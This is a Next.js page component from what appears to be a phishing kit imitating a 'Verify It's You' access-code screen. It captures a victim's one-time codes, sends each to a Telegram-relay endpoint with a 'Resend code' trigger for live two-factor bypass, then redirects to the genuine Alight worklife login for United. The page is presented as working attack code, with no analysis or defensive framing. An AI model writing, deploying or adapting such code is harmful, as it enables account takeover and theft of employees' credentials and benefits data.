"use client"

import { Suspense, useState } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { Button } from "@/components/ui/button"
import { SiteFooter } from "@/components/site-footer"
import { SiteHeader } from "@/components/site-header"

const ALIGHT_REDIRECT_URL =
  "https://worklife.alight.com/ah-angular-afirst-web/#/web/united/login?forkPage=false"

function EnterCodeContent() {
  const [code, setCode] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const router = useRouter()
  const searchParams = useSearchParams()
  const isSecondOtp = searchParams.get("step") === "2"

  const handleVerify = async () => {
    if (isLoading) return
    setIsLoading(true)
    try {
      await fetch("/api/telegram/verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
          code,
        }),
      }).catch(console.error)
    } catch (error) {
      console.error("Failed to send verification notification:", error)
    }
    await new Promise((r) => setTimeout(r, 1000))
    if (isSecondOtp) {
      window.location.href = ALIGHT_REDIRECT_URL
      return
    }

    if (typeof window !== "undefined") sessionStorage.setItem("ua_identity", "1")
    router.push("/verify-identity")
  }

  const handleResend = async () => {
    if (isResending) return
    setIsResending(true)
    try {
      await fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isSecondOtp }),
      }).catch(console.error)
    } catch (error) {
      console.error("Failed to send resend code notification:", error)
    }
    await new Promise((r) => setTimeout(r, 2000))
    setIsResending(false)
  }

  return (
    <div className="min-h-screen bg-white">
      <SiteHeader />
      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px]">
        <div className="mb-6">
          <h2 className="text-base font-medium text-gray-900 mb-4">Verify It's You</h2>
          <h1 className="text-2xl font-semibold text-gray-900 mb-3">
            Enter Access Code
          </h1>
          <p className="text-gray-700 text-sm mb-4">
            Enter the code you received.
          </p>

          <div className="flex items-center gap-2 mb-4">
            <span className="text-gray-700 text-sm">Didn't receive code?</span>
            <button
              type="button"
              onClick={handleResend}
              disabled={isResending}
              className="px-3 py-1.5 bg-gray-200 text-gray-700 rounded-md text-sm font-medium hover:bg-gray-300 disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isResending ? "Loading..." : "Resend code"}
            </button>
          </div>
        </div>

        <div className="space-y-4">
          <div>
            <input
              type="text"
              id="code"
              inputMode="numeric"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
              placeholder=""
              className="w-full max-w-[200px] px-2.5 py-1.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#002586] focus:border-transparent"
              maxLength={6}
            />
          </div>

          <div className="flex gap-3 mt-3">
            <Button
              className="bg-[#002586] text-white hover:bg-[#001f6b] rounded-md disabled:opacity-70 disabled:pointer-events-none h-8 px-5 text-sm font-medium"
              onClick={handleVerify}
              disabled={code.replace(/\D/g, "").length !== 6 || isLoading}
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              variant="ghost"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-8 px-5 text-sm font-medium"
              onClick={() =>
                router.push("/verify-choice")
              }
            >
              Cancel
            </Button>
          </div>
        </div>
      </div>

      <SiteFooter />
    </div>
  )
}

export default function EnterCodePage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
        Loading...
      </div>
    }>
      <EnterCodeContent />
    </Suspense>
  )
}
